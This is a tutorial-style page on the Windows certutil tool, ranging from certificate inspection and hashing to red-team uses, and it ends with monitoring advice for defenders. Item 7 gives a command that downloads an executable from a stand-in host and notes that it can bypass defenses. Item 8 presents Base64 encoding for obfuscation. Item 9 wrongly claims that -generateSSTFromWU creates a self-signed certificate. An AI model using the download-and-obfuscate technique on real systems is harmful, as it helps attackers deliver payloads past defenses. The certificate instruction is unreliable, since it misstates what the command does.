`certutil` is a versatile command-line tool in [[Windows]] that is part of the Certificate Services. It can be used for a variety of tasks like managing certificates, encoding/decoding, downloading files, and even hashing. Below is a progression from beginner to advanced use cases for a security researcher.

### Beginner Level

1. **Basic Information on Certutil**
   To get general help about the `certutil` command and all available subcommands:
   ```bash
   certutil -help
   ```

2. **Displaying Certificate Information**
   You can use `certutil` to display information about a certificate file, such as a `.cer`, `.pfx`, or `.crt` file:
   ```bash
   certutil -dump C:\path\to\certificate.cer
   ```
   This displays a detailed dump of the certificate's properties, including its public key, validity dates, and extensions.

3. **Checking CA Certificates**
   To list all the certificates in the local machine’s trusted root certification authority (CA) store:
   ```bash
   certutil -store -enterprise root
   ```

### Intermediate Level

4. **Hashing Files**
   One of the useful functions of `certutil` is its ability to compute file hashes for integrity verification. You can hash files using various algorithms like MD5, SHA1, or SHA256:
   ```bash
   certutil -hashfile C:\path\to\file.txt SHA256
   ```

5. **Exporting Certificates**
   Exporting a certificate from a certificate store using `certutil` can be useful for analysis or backup:
   ```bash
   certutil -store my | findstr "Serial"
   ```
   Once you locate the serial number, export the certificate using:
   ```bash
   certutil -exportcert -out C:\path\to\exported.cer -store my <serial_number>
   ```

6. **Viewing Revocation List**
   A certificate revocation list (CRL) is important in determining the validity of certificates. You can display a CRL file like this:
   ```bash
   certutil -dump C:\path\to\crl.crl
   ```

### Advanced Level (Pro)

7. **Downloading Files (Living Off the Land)**
   As a security researcher or red teamer, `certutil` is often used to download files from remote locations. This is because `certutil` is a trusted binary and may bypass defenses:
   ```bash
   certutil -urlcache -split -f http://example.com/file.exe C:\path\to\output.exe
   ```
   *Note:* This usage can be abused for malicious purposes, so it's monitored by many security solutions.

8. **Encoding and Decoding Files**
   Certutil can be used to encode or decode files in Base64. This is useful for obfuscating files or for situations where only text-based transfer is allowed:
   - **Encoding**:
     ```bash
     certutil -encode C:\path\to\file.txt C:\path\to\encoded.txt
     ```
   - **Decoding**:
     ```bash
     certutil -decode C:\path\to\encoded.txt C:\path\to\decoded.txt
     ```

9. **Creating Your Own Certificates (Self-Signed)**
   You can create your own self-signed certificate for testing purposes:
   ```bash
   certutil -generateSSTFromWU C:\path\to\selfsigned.sst
   ```
   This is typically used in scenarios where you need a test certificate for web application security testing, though it’s less common in production.

10. **Viewing and Manipulating Active Directory Certificates**
    In a domain environment, you may need to enumerate certificates related to Active Directory:
    ```bash
    certutil -dcinfo
    ```
    This command can be helpful during penetration tests for enumerating certificates that could be leveraged in attacks like Kerberos.

11. **Forensic Use: Parsing EFS (Encrypted File System) Certificates**
    In digital forensics, you may want to extract EFS-related certificates for analysis:
    ```bash
    certutil -user -store my
    ```

### Security Considerations

As a security researcher or red teamer, bear in mind the following:
- **Monitoring**: `certutil` usage, especially for file downloads or Base64 encoding/decoding, is often monitored by endpoint detection and response (EDR) tools. Make sure to test in isolated environments.
- **Obfuscation**: Adversaries often use `certutil` for malicious activities due to its availability on most Windows machines. Understand how to detect and monitor its usage in your blue team efforts.
